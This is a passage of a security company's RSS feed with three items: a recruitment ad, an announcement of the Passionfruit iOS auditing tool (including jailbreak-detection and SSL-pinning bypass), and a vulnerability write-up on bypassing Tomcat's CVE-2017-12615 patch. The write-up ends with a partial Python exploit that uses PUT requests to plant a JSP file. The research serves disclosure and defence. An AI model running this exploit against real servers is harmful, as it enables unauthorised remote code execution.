<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2017-10-27-30515472.htm</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/30515472&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-550fa0c48fdc0b4ab5d1281c4cc098fd_r.png&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;blockquote&gt;我大学的时候学了一份&lt;b&gt;特别牛逼、高大上&lt;/b&gt;的专业——生物科学。&lt;br&gt;至于为啥我学了这个专业，不知道是哪个神人在我报志愿之前，天天吹捧&lt;b&gt;21世纪是生物学的天下&lt;/b&gt;！&lt;br&gt;当时研究了三个专业：生物工程、生物技术、生物科学，&lt;b&gt;只有这个生物科学听起来是最为牛逼&lt;/b&gt;的。&lt;br&gt;现在看起来依然牛逼，毕业之后工作也确实难找。&lt;br&gt;其实除了班里一半深造的，其他的人只有一个从事了生物行业。&lt;br&gt;最为蛋疼的是，好几个准备考公务员却止步于专业限制，我们这个专业考公务员都受限！&lt;br&gt;那位说21世纪是生物学的神人同志，现在我要来跟你聊一下人生聊一下理想。&lt;/blockquote&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;blockquote&gt;我是正在找工作的应届师范生。&lt;br&gt;当初选了服从调剂专业，教育技术，开始一年都不知道干嘛的，大概就是中学信息技术老师。&lt;br&gt;当时觉得当个副科老师不错啊！&lt;br&gt;真正找工作了才发现，市场需求太少！！&lt;br&gt;&lt;b&gt;没几个学校缺信息技术老师的！！！&lt;/b&gt;&lt;br&gt;语文数学的一招就是几十个，信息技术一两个或者压根不要，不当老师又不知道还能干嘛？&lt;/blockquote&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;blockquote&gt;本科生物，学霸，&lt;b&gt;成绩top 1％&lt;/b&gt;，&lt;br&gt;然后，大四没有找到工作……&lt;br&gt;怒而考研，&lt;b&gt;跨专业，挑战CS&lt;/b&gt;（计算机）&lt;br&gt;真是比高三还辛苦，高三时无知者无畏，没什么压力。&lt;br&gt;虽然之前一直努力，但稳稳妥妥生物与CS，风马牛不相及啊。&lt;br&gt;&lt;b&gt;考研努力流过的汗都是当年选专业时脑子进的水啊~&lt;/b&gt;&lt;br&gt;都说转行毁三年，诚然，我三年的生物学积累毁于一旦。&lt;br&gt;然，不转，毁我一生！&lt;br&gt;不过，“21世纪是生物的世纪”，现在毕竟只是世纪之初，以后的事谁又能预料。&lt;br&gt;不过，不会后悔。我爱CS，JUST DO IT!&lt;/blockquote&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;这些案例，是不是看着有些眼熟？&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;说的就是你对不对？&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;（备注：以上并不是吐槽任何专业不好，而是部分专业确实存在就业难的问题，请勿吐槽）&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;影影绰绰中，我们提出一个大胆的想法！&lt;/p&gt;&lt;p&gt;&lt;b&gt;不！限！专！业！&lt;/b&gt;&lt;/p&gt;&lt;p&gt;醉心CS，爱钻研，懂技术，享受成就的你们！&lt;/p&gt;&lt;p&gt;&lt;b&gt;有胆量，来长亭试试吧！&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;不是怂恿放弃其他专业，而是当你心中有这个声音时，多给你一个选择！&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;CROSS计划&lt;/b&gt;，是长亭科技为发掘在计算机领域中拥有独到见解与研究的&lt;b&gt;非计算机专业人才&lt;/b&gt;而决定每年保留的校招计划！接头口号： &lt;b&gt;好胆你就来！&lt;/b&gt;&lt;/p&gt;&lt;p&gt;不管你学什么专业，建筑、土木、数学甚至是与计算机毫不相关的文科生，只要你对计算机领域拥有浓厚的兴趣，且在业余时间：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;花了足够的精力去钻研，&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;有扎实的数理基础，&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;有独立的思考和研究态度&lt;/b&gt;，&lt;/p&gt;&lt;p&gt;&lt;b&gt;我们统统欢迎！&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;其实，我们也&lt;b&gt;怕&lt;/b&gt;！&lt;/p&gt;&lt;p&gt;&lt;b&gt;怕&lt;/b&gt;这个活动没有那么多人响应，&lt;/p&gt;&lt;p&gt;&lt;b&gt;怕&lt;/b&gt;你们害怕自己技术不行，&lt;/p&gt;&lt;p&gt;&lt;b&gt;怕&lt;/b&gt;有人觉得长亭这个提议太理想国了！&lt;/p&gt;&lt;p&gt;While，我们选择站了出来，毕竟，&lt;/p&gt;&lt;p&gt;&lt;b&gt;放胆迈出第一步，才有可能将理想变成现实！&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;所以，邀请您，你，恁，&lt;b&gt;好胆你就来&lt;/b&gt;！&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;不是计算机专业≠不是计算机人才&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;当你心中有这个声音时，多给你一个选择。&lt;/p&gt;&lt;p&gt;大胆地迈出这一步，做自己真正想做的事情。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;在这里，你可以跟随技术大牛光速起步，迅速打下扎实的计算机功底。&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;在这里，你可以参与各种规范的工程项目，快速积累丰富的工程经验。&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;在这里，你还可以接触最新最酷的黑客技术，见证各种魔术般颠覆想象的神奇。&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;而以上通通不是吹牛，因为我们有足够多的转行成功案例，他们来自于不同的专业：数学、水利、航空航天、航海、机械等等等等，哦差点忘了，还。。。还有秘书专业。&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;应届毕业生通过CROSS计划：&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;1. 进入长亭科技产品研发部门实习&lt;/p&gt;&lt;p&gt;2. 获得长亭技术大佬&lt;b&gt;1对1指导&lt;/b&gt;的珍贵机会（CTO亲自参与）&lt;/p&gt;&lt;p&gt;3. 更有毕业后直接转正的机会！&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;友情提示：&lt;/p&gt;&lt;p&gt;长亭是一个对技术期望颇高的团队，&lt;/p&gt;&lt;p&gt;然而我们更看重的，&lt;/p&gt;&lt;p&gt;是你思考问题的思路，&lt;/p&gt;&lt;p&gt;看待世界的角度！&lt;/p&gt;&lt;p&gt;如果刚好你也这样，那就来吧！&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;&lt;i&gt;计算机专业的同学也不要自卑，&lt;/i&gt;&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;&lt;i&gt;简历也不会被扔出去！&lt;/i&gt;&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;除了研发岗位，&lt;b&gt;市场、销售、技术支持&lt;/b&gt;等岗位也在期待你的加入！具体岗位信息请戳长亭科技官网（&lt;a href=&quot;https://chaitin.cn/cn/join-us.html&quot;&gt;https://chaitin.cn/cn/join-us.html&lt;/a&gt;）&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;简历投递传送门：hr@chaitin.com&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;邮件主题请注明 “CROSS计划”！&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;来！&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;</description>
<author>朱文雷</author>
<guid isPermaLink="false">2017-10-27-30515472</guid>
<pubDate>Fri, 27 Oct 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>开源！iOS 应用安全分析工具 Passionfruit</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2017-10-15-29761306.htm</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/29761306&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-e590742eb8fe8628767544ef478ee70d_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;Github 项目地址 &lt;a href=&quot;https://github.com/chaitin/passionfruit&quot;&gt;chaitin/passionfruit&lt;/a&gt;&lt;/p&gt;&lt;h2&gt;前情提要&lt;/h2&gt;&lt;p&gt;虽然没有 Android 平台那么多的攻击面和利用姿势，iOS 应用依然有安全审计的需求。移动平台的安全目前采用的策略基本上都是扫描器加上一部分人工的逆向和动态分析。&lt;/p&gt;&lt;p&gt;针对 iOS 应用攻击面分析，目前笔者了解或使用过的相关工具如下（除去逆向工程使用的调试器和反汇编工具）：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Snoop-It（已停止维护）&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/dmayer/idb&quot;&gt;dmayer/idb&lt;/a&gt; idb is a tool to simplify some common tasks for iOS pentesting and research&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/mwrlabs/needle&quot;&gt;mwrlabs/needle&lt;/a&gt; The iOS Security Testing Framework&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/sensepost/objection&quot;&gt;sensepost/objection&lt;/a&gt; 📱 objection - runtime mobile exploration&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/iSECPartners/Introspy-iOS&quot;&gt;iSECPartners/Introspy-iOS&lt;/a&gt; IntroSpy&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;在使用中笔者多多少少遇到了一些问题，例如 needle 在设备上需要部署过多依赖包，idb 不兼容 iOS 10，Introspy 虽好但查询日志数据库有一些麻烦……忍不住开始造轮子。&lt;/p&gt;&lt;p&gt;审计工具所需功能大体有如下几个方面：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;分析应用是否开启了必要的编译器保护&lt;/li&gt;&lt;li&gt;分析应用沙盒内的文件内容和权限&lt;/li&gt;&lt;li&gt;分析应用使用到的 framework 和动态链接库&lt;/li&gt;&lt;li&gt;分析应用存储的数据，如 UserDefaults, BinaryCookie 和 KeyChain&lt;/li&gt;&lt;li&gt;分析剪贴板的使用&lt;/li&gt;&lt;li&gt;动态拦截和分析 Objective C 运行时方法&lt;/li&gt;&lt;li&gt;动态拦截和分析本地代码的参数调用和堆栈追踪&lt;/li&gt;&lt;li&gt;分析 UIView 的层级结构和属性&lt;/li&gt;&lt;li&gt;一些基于 hook 实现的修改功能，如设备特征伪造、绕过越狱检测、绕过 SSL Pinning 等&lt;/li&gt;&lt;/ul&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-869fa78c8cd0772eaf1d44711a7e471a_r.jpg&quot; data-caption=&quot;&quot; data-rawwidth=&quot;2560&quot; data-rawheight=&quot;1556&quot;&gt;&lt;p&gt;&lt;i&gt;应用目前仍然在开发中，可能会有 bug 或功能缺失。&lt;/i&gt;&lt;/p&gt;&lt;h2&gt;设计&lt;/h2&gt;&lt;p&gt;在实现方案上，笔者选择了功能极为强大的 hook 框架 &lt;a href=&quot;https://www.frida.re/&quot;&gt;frida.re&lt;/a&gt;。关于这个框架不需要我再过多介绍，它在 iOS 平台上支持对 native 函数、Objective C 运行时的 hook 和调用，可以满足多种移动安全运行时分析的自动化需求。&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-5b1570480dfb0ae145555cb3a44b73fe_r.jpg&quot; data-caption=&quot;&quot; data-rawwidth=&quot;817&quot; data-rawheight=&quot;318&quot;&gt;&lt;p&gt;Passionfruit 通过 frida 注入代码到目标应用实现功能，再通过 node.js 服务端消息代理与浏览器通信，用户通过访问网页即可对 App 实现常规的检测任务。&lt;/p&gt;&lt;h2&gt;安装和使用&lt;/h2&gt;&lt;p&gt;请访问 GitHub 上的项目主页 &lt;a href=&quot;https://github.com/chaitin/passionfruit&quot;&gt;chaitin/passionfruit&lt;/a&gt; 来获取最新的版本和更新信息。&lt;/p&gt;&lt;p&gt;Passionfruit 的编译和安装依赖如下软件：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://nodejs.org/&quot;&gt;node.js&lt;/a&gt; 用于运行服务端。可根据个人喜好使用 &lt;a href=&quot;https://yarnpkg.com/&quot;&gt;yarn&lt;/a&gt; 或默认的 &lt;a href=&quot;https://www.npmjs.com/&quot;&gt;npm&lt;/a&gt; 作为包管理&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/libimobiledevice/libimobiledevice&quot;&gt;libimobiledevice&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;安装步骤&lt;/p&gt;&lt;ol&gt;&lt;li&gt;安装 node.js 和 libimobiledevice&lt;/li&gt;&lt;li&gt;通过 git 将代码仓库同步到本地&lt;/li&gt;&lt;li&gt;在越狱 iOS 设备上安装 frida&lt;/li&gt;&lt;li&gt;在非越狱设备上使用 ipa 重打包注入 fridagadget.dylib&lt;/li&gt;&lt;li&gt;第一次使用前，在代码根目录运行 npm run build 构建前端代码&lt;/li&gt;&lt;li&gt;运行 npm start 运行服务端，在浏览器中访问 localhost:31337&lt;/li&gt;&lt;/ol&gt;&lt;h2&gt;功能和演示&lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;video id=&quot;None&quot; data-swfurl=&quot;&quot; poster=&quot;https://pic2.zhimg.com/80/v2-2f92b2ec64b187be4cbcaa134b697131_b.jpg&quot; data-sourceurl=&quot;https://www.zhihu.com/video/902688743067090944&quot; data-name=&quot;&quot; data-video-id=&quot;&quot; data-video-playable=&quot;true&quot; data-lens-id=&quot;902688743067090944&quot;&gt;&lt;/video&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;Passionfruit 最大特点就是基于 Web 的图形界面。因此你甚至可以在 iPad Pro 这样的移动设备上访问这个图形界面……（需要修改服务端监听的配置）&lt;/p&gt;&lt;p&gt;完全图形化的界面可以快速地找到需要 hook 的函数。由于 C 函数缺少运行时参数类型信息，因此对于这些库函数您需要手动设置一下函数原型。Objective C 可以直接根据反射打印出参数和返回值。&lt;/p&gt;&lt;p&gt;其他工具实现的 checksec 是基于 otool 检查应用的可执行文件，需要在设备上安装额外的依赖，或将文件从设备中同步到本地执行命令。Passionfruit 直接分析内存中映射的内容，因此要快上很多。在文件查看方面，Passionfruit 直接读取应用沙盒内的 Plist、SQLite 数据库，相比先 scp 下载然后查看可以节约一些时间。&lt;/p&gt;&lt;p&gt;Passionfruit 在不少界面都添加了搜索功能，如模块列表、导出符号、Objective C 类，甚至 Plist 这样的序列化数据。&lt;/p&gt;&lt;p&gt;在 iOS 10 中有一个非公开 API UIDebuggingInformationOverlay 可用来在设备上分析界面层级，您可以在 Passionfruit 的 UIDump 面板中点击按钮来激活这个界面。&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-5dac5ae80092b44c7e266b9aa4937a67_r.jpg&quot; data-caption=&quot;&quot; data-rawwidth=&quot;640&quot; data-rawheight=&quot;1136&quot;&gt;&lt;p&gt;如果您有单步、界面分析等更高级的调试需求，建议还是使用 debugserver 等专门的调试工具。&lt;/p&gt;&lt;h2&gt;FAQ&lt;/h2&gt;&lt;p&gt;&lt;b&gt;需要越狱吗？&lt;/b&gt;&lt;/p&gt;&lt;p&gt;更新：项目发布后收到了 frida 作者本尊贡献的代码，现在已经不需要越狱了！&lt;/p&gt;&lt;p&gt;Frida 可以通过对已砸壳的 ipa 添加 fridagadget.dylib，重打包、重签名后在非越狱设备上试用，具体步骤可参考： &lt;a href=&quot;http://www.jianshu.com/p/ce2770c42ead&quot;&gt;iOS App的Patching和Resigning&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;为什么不支持 NSLog 查看？&lt;/b&gt;&lt;/p&gt;&lt;p&gt;本工具使用的界面是基于浏览器的，对于 NSLog 日志这种快速刷新的内容，实时展示会造成显著的性能问题。在现有工具（Xcode，macOS 自带的 Console，libimoviledevice 的 idevicesyslog 命令）足够强大的情况下，没有必要再开发一个（更难用的）了。&lt;/p&gt;</description>
<author>0xCC</author>
<guid isPermaLink="false">2017-10-15-29761306</guid>
<pubDate>Sun, 15 Oct 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>Abuse Cache of WinNTFileSystem : Yet Another Bypass of Tomcat CVE-2017-12615</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2017-09-25-29649377.htm</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/29649377&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-30037f9018107abef8aa559996cbb61b_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;作者：Pocky &lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x01 CVE-2017-12615 补丁分析&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;CVE-2017-12615 是 Tomcat 在设置了 readonly 为 false 状态下，可以通过 PUT 创建一个“.jsp ”的文件。由于后缀名非 .jsp 和 .jspx ，所以 Tomcat 在处理的时候经由 DefaultServlet 处理而不是 JspServlet ，又由于 Windows 不允许文件名为空格结尾，所以可以成功创建一个 JSP 文件，以达到 RCE 的结果。  &lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;龙哥在周五敲我说，在高并发的情况下，还是可以成功写入一个 JSP 文件；同时微博上的一个小伙伴也告诉我，在一定的条件下还是可以成功创建文件。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;测试发现，对于 7.0.81 可以成功复现，但是对于 8.5.21 失败。如下代码分析是基于 Apache Tomcat 7.0.81 的。&lt;/b&gt;经过分析，我发现这两种情况其实本质是相同的。不过在此之前，首先看一下 Tomcat 对于 CVE-2017-12615 的补丁好了。  &lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;同样的，进入 DefaultServlet 的 doPut 方法，再调用到 FileDirContext 的 bind 方法，接着调用 file 方法：  &lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;   protected File file(String name, boolean mustExist) {
        File file = new File(base, name);
        return validate(file, mustExist, absoluteBase);
    }&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;注意到 mustExist 为 false ：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;   protected File validate(File file, boolean mustExist, String absoluteBase) {
    
        if (!mustExist || file.exists() &amp;amp;&amp;amp; file.canRead()) { // !mustExist = true，进入 if
            ...
            try {
                canPath = file.getCanonicalPath(); 
                // 此处，对路径进行规范化，调用的是 java.io.File 内的方法
                // 之前的 Payload 中结尾为空格，那么这个方法就会去掉空格
            } catch (IOException e) {
    
            }
            ...
            if ((absoluteBase.length() &amp;lt; absPath.length())
                &amp;amp;&amp;amp; (absoluteBase.length() &amp;lt; canPath.length())) {
                ...
                // 判断规范化的路径以及传入的路径是否相等，由于 canPath 没有空格，return null
                if (!canPath.equals(absPath))
                    return null;
            }
        } else {
            return null;
        }&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;经过上述的判断，导致我们无法通过空格来创建 JSP 文件。  &lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;但是之前提到，在高并发或者另外一种情况下，却又能创建 JSP 文件，也就是说 canPath.equals(absPath) 为 true 。通过深入分析，找出了其原因。  &lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;0x02 WinNTFileSystem.canonicalize &lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;上述代码中，对于路径的规范化是调用的 file.getCanonicalPath() ：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;   public String getCanonicalPath() throws IOException {
        if (isInvalid()) {
            throw new IOException(&quot;Invalid file path&quot;);
        }
        return fs.canonicalize(fs.resolve(this));
    }&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;也就是调用 FS 的 canonicalize 方法，对于 Windows，调用的是 WinNTFileSystem.canonicalize 。这个 Bypass 的锅也就出在 WinNTFileSystem.canonicalize 里，下面为其代码，我已去处掉了无关代码可以更清晰的了解原因。 &lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;   @Override
    public String canonicalize(String path) throws IOException {
        ...
        if (!useCanonCaches) { // !useCanonCaches = false
            return canonicalize0(path);
        } else {
            // 进入此处分支
            String res = cache.get(path);
            if (res == null) {
                String dir = null;
                String resDir = null;
                if (useCanonPrefixCache) {
                    dir = parentOrNull(path);
                    if (dir != null) {
                        resDir = prefixCache.get(dir);
                        if (resDir != null) {
                            String filename = path.substring(1 + dir.length());
                            // 此处 canonicalizeWithPrefix 不会去掉尾部空格
                            res = canonicalizeWithPrefix(resDir, filename);
                            cache.put(dir + File.separatorChar + filename, res);
                        }
                    }
                }
                if (res == null) {
                    // 此处的 canonicalize0 会将尾部空格去掉
                    res = canonicalize0(path);
                    cache.put(path, res);
                    if (useCanonPrefixCache &amp;amp;&amp;amp; dir != null) {
                        resDir = parentOrNull(res);
                        if (resDir != null) {
                            File f = new File(res);
                            if (f.exists() &amp;amp;&amp;amp; !f.isDirectory()) {
                                prefixCache.put(dir, resDir);
                            }
                        }
                    }
                }
            }
            // 返回路径
            return res;
        }
    }&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;上述代码有一个非常非常神奇的地方：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;canonicalizeWithPrefix(resDir, filename) 不会去掉路径尾部空格&lt;/li&gt;&lt;li&gt;canonicalize0(path) 会去掉路径尾部空格&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;为了满足进入存在 canonicalizeWithPrefix 的分支，需要通过两个判断：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;String res = cache.get(path); 应为 null ，此处 PUT 一个从未 PUT 过的文件名即可&lt;/li&gt;&lt;li&gt;resDir = prefixCache.get(dir); 应不为 null&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;可以发现，对于 prefixCache 进行添加元素的操作在下方存在 canonicalize0 的 if 分支：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;           if (res == null) {
                res = canonicalize0(path);
                cache.put(path, res);
                if (useCanonPrefixCache &amp;amp;&amp;amp; dir != null) {
                    resDir = parentOrNull(res);
                    if (resDir != null) {
                        File f = new File(res);
                        if (f.exists() &amp;amp;&amp;amp; !f.isDirectory()) { // 需要满足条件
                            prefixCache.put(dir, resDir); // 进行 put 操作&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;通过代码可知，如果想在 prefixCache 存入数据，需要满足&lt;b&gt;文件存在&lt;/b&gt;且&lt;b&gt;文件不是目录&lt;/b&gt;的条件。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;prefixCache 存放的是什么数据呢？通过单步调试可以发现：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-c3bda57d16a4c9ce6fd36f4fc5f06193_r.jpg&quot; data-rawwidth=&quot;657&quot; data-rawheight=&quot;250&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;resDir 为文件所在的绝对路径。  &lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;那么如果想进入 canonicalizeWithPrefix 的分支，需要满足的两个条件已经理清楚了。从 prefixCache.put 开始，触发漏洞需要的流程如下。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;0x03 The Exploit&lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;首先，要向 prefixCache 中添加内容，那么需要满足 f.exists() &amp;amp;&amp;amp; !f.isDirectory() 这个条件。仍然还是空格的锅：  &lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;   &amp;gt;&amp;gt;&amp;gt; os.path.exists(&quot;C:/Windows/System32/cmd.exe&quot;)
   True
   &amp;gt;&amp;gt;&amp;gt; os.path.exists(&quot;C:/Windows/System32/cmd.exe &quot;)
   True&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;那么，在无已知文件的情况下，我们只需要先 PUT 创建一个 test.txt ，在 PUT  一个 test.txt%20 ，即可向 prefixCache 添加数据了。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-cf3dc76a2af468e27d8b2ffb05e5cf5d_r.jpg&quot; data-rawwidth=&quot;850&quot; data-rawheight=&quot;144&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-c7469352b8428fc259cc53dc156aa20f_r.jpg&quot; data-rawwidth=&quot;949&quot; data-rawheight=&quot;173&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;单步查看，发现已经通过分支，并且向 prefixCache 添加数据：  &lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-bff33dc63d977443793f73b01a09cd15_r.jpg&quot; data-rawwidth=&quot;992&quot; data-rawheight=&quot;467&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;接着，创建一个 JSP 文件 “test.jsp%20” ，单步查看：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-a7d81e24db7ee37733f7fcb497882f79_r.jpg&quot; data-rawwidth=&quot;884&quot; data-rawheight=&quot;625&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;可以发现，resDir 不为 null ，且 res 结尾带着空格。于是可以通过最开始的 canPath.equals(absPath) 的检查。查看 BurpSuite 中的返回：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-6f70c318355bdc1b7c73ac6004204b32_r.jpg&quot; data-rawwidth=&quot;953&quot; data-rawheight=&quot;181&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;发现已经创建成功了。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;Exploit:&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;   import sys
   import requests
   import random
   import hashlib
   shell_content = &#39;&#39;&#39;
   RR is handsome!
   &#39;&#39;&#39;
   if len(sys.argv) &amp;lt;= 1:
       print(&#39;Usage: python tomcat.py [url]&#39;)
       exit(1)
   def main():
       filename = hashlib.md5(str(random.random())).hexdigest()[:6]
       put_url = &#39;{}/{}.txt&#39;.format(sys.argv[1], filename)
       shell_url = &#39;{}/{}.jsp&#39;.format(sys.argv[1], filename)
       requests.put(put_url, data=&#39;1&#39;)
       requests.put(put_url + &#39;%20&#39;, data=&#39;1&#39;)
       requests.put(shell_url + &#39;%20&#39;, data=shell_content)
       requests.delete(put_url)
       print(&#39;Shell URL: {}&#39;.format(shell_url))
   if __name__ == &#39;__main__&#39;:
